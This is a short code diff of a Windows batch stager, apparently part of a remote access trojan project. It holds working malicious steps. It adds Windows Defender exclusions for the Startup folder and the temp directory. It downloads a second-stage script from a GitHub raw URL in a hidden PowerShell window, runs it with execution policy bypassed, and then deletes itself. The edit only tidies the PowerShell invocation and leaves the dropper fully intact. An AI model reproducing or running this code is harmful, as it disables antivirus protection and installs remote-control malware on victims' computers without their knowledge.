@@ -27,6 +27,6 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
-powershell powershell.exe -windowstyle hidden "curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat"; timeout 5;
-powershell powershell.exe -windowstyle hidden -ep bypass ./secondary.bat
+powershell  -windowstyle hidden "curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat"; timeout 5;
+powershell -windowstyle hidden -ep bypass ./secondary.bat
 del Starter.bat
